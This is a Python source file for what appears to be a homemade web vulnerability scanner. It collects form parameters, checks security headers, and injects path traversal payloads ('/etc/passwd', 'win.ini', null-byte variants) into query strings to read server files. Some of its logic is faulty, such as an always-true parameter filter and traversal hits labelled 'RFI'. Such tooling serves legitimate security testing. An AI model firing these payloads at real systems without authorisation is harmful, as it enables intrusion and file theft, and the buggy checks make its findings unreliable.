import requests
import mechanicalsoup
import requests
from bs4 import BeautifulSoup
from urllib.parse import parse_qsl, urljoin, urlparse
from urllib.parse import parse_qs
from collections import OrderedDict
from collections import Counter
import os
from urllib.parse import urlparse, urlunparse,urlencode,urljoin
import re
from collections import deque
from bs4 import BeautifulSoup
import requests
import requests.exceptions
from urllib.parse import urlsplit
from urllib.parse import urlparse
from collections import deque
import urllib3
urllib3.disable_warnings()

proxies = {
    "http" : "http://localhost:8080",
    "https" : "http://localhost:8080"
}
def get_base_domain(url):
    parsed_url = urlparse(url)
    return parsed_url.netloc

def extract_form_parameters(url):
    response = requests.get(url,verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    parameters = {}
    newurl = ''
    try : 
        form = soup.find('form',method='GET')
        if form is None :
            form = soup.find('form',method='get')
        action = form.get('action')
        method = form.get('method', 'GET')
        inputs = form.find_all(['input', 'select','textarea'])

        for input_tag in inputs:
            name = input_tag.get('name')
            value = input_tag.get('value', '')

            if name:
                parameters[name] = value
    except:
        print("no parameter get")
    for param in parameters:
        if method == 'GET':
            temp = requests.get(url,params=parameters,verify=False)
            newurl = temp.url
    print('params',parameters)
    print('new :',newurl)
    return parameters

def extract_post_parameters(url):
    response = requests.get(url,verify=False)
    print(response.url)
    parameters = {}
    urlcontain = ''
    soup = BeautifulSoup(response.text, 'html.parser')
    try :
        forms = soup.find_all('form', method='POST')
        if len(forms) == 0:
            forms = soup.find_all('form', method='post')
        for form in forms:
            method = form.get('method', 'post')
            inputs = form.find_all(['input', 'select','textarea'])
            for input_tag in inputs:
                if input_tag.name == 'input':
                    name = input_tag.get('name')
                    value = input_tag.get('value', '')
                    if name and name not in parameters:
                        parameters[name] = value
                elif input_tag.name == 'textarea':
                    name = input_tag.get('name')
                    value = input_tag.get('value', '')
                    if name and name not in parameters:
                        parameters[name] = value
                elif input_tag.name == 'select':
                    name = input_tag.get('name')
                    selected_option = input_tag.find('option', selected=True)
                    value = selected_option.get('value', '') if selected_option else ''
                    if name and name not in parameters:
                        parameters[name] = value
    except:
        print("not post")
    if parameters:
        if method == 'POST':       
            postdata = requests.post(url, params=parameters,verify=False)
            print('POST :',postdata.url)
            urlcontain = postdata.url
    return parameters   
class UnauthenScanHeaders:
    def __init__(self, url):
        self.url = url
        response = requests.get(self.url)
        self.headers = response.headers
        self.cookies = response.cookies
    def scan_xframe(self):
        """X-Frame-Options should be set to DENY or SAMEORIGIN"""
        try:
            if "deny" in self.headers["X-Frame-Options"].lower():
                print("[+]", "X-Frame-Options", ':', "pass")
                check = False
                return check
            elif "sameorigin" in self.headers["X-Frame-Options"].lower():
                print("[+]", "X-Frame-Options", ':', "pass")
                check = False
                return check
            else:
                print("[-]", "X-Frame-Options header not set correctly", ':', "fail!")
                check = True
                return check
        except KeyError:
            print("[-]", "X-Frame-Options header not present", ':', "fail!")
            check = True
            return check
            
    def scan_hsts(self):
        """config failure if HSTS header is not present"""
        try:
            if self.headers["Strict-Transport-Security"]:
                print("[+]", "Strict-Transport-Security", ':', "pass")
                check = False
                return check
        except KeyError:
            print("[-]", "Strict-Transport-Security header not present", ':', "fail!")
            check = True
            return check
    
    def scan_policy(self):
        """config failure if Security Policy header is not present"""
        try:
            if self.headers["Content-Security-Policy"]:
                print("[+]", "Content-Security-Policy", ':', "pass")
                check = False
                return check
        except KeyError:
            print("[-]", "Content-Security-Policy header not present", ':', "fail!")
            check = True
            return check
    def scan_server(self):
        try:
            if self.headers["Server"] or self.headers["X-Powered-By"]:
                if self.headers["X-Powered-By"]:
                    server_info = self.headers['X-Powered-By']
                else:
                    server_info = self.headers['Server']
                print("Server information:", server_info)
                check = True
                return check
            else:
                print("Server information not found")
                check = False
                return check
        except KeyError:
            print("[-]", "Access-Control-Allow-Origin' header not found", ':', "fail!")
            check = False
            return check    

def unau_path_travel_scan(scanurl):
    parsed_url = urlparse(scanurl)
    query_params = parse_qs(parsed_url.query)
    print(query_params)
    filepath = './src/payload/rfi.txt'
    linux_file_paths = [
        "/etc/passwd",
        "/etc/hosts","/etc/passwd%00",
        "/etc/hosts%00",
        "/etc/passwd%00.jpg",
        "/etc/hosts%00.jpg",
        
    ]

    windows_file_paths = [
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini%00",
        "C:\\Windows\\System32\\drivers\\etc\\hosts%00",
        "C:\\Windows\\win.ini%00.jpg",
        "C:\\Windows\\System32\\drivers\\etc\\hosts%00.jpg",
    ]
    with open(filepath) as fp:
        line = fp.readline()
        while line:
            combined = line.strip()
            for param in query_params:
                if param != 'Submit' or param != 'Confirm':
                    for linux in linux_file_paths:
                        query_params[param] = combined + linux
                        updated_query = urlencode(query_params, doseq=True)
                        new_url_parts = list(parsed_url)
                        new_url_parts[4] = updated_query
                        new_url = urlunparse(new_url_parts)
                        rs = requests.get(new_url,verify=False)
                        if "root:" in rs.text:
                            print('FOUND RFI in payload', query_params[param])
                            payload = 'FOUND RFI in payload: ' + query_params[param]
                            return True, payload
                    for window in windows_file_paths:
                        query_params[param] = combined + window
                        updated_query = urlencode(query_params, doseq=True)
                        new_url_parts = list(parsed_url)
                        new_url_parts[4] = updated_query
                        new_url = urlunparse(new_url_parts)
                        rs = requests.get(new_url,verify=False)
                        if "Windows" in rs.text:
                            print('FOUND RFI in payload',query_params[param])
                            payload = 'FOUND RFI in payload: ' + query_params[param]
                            return True, payload
            line = fp.readline()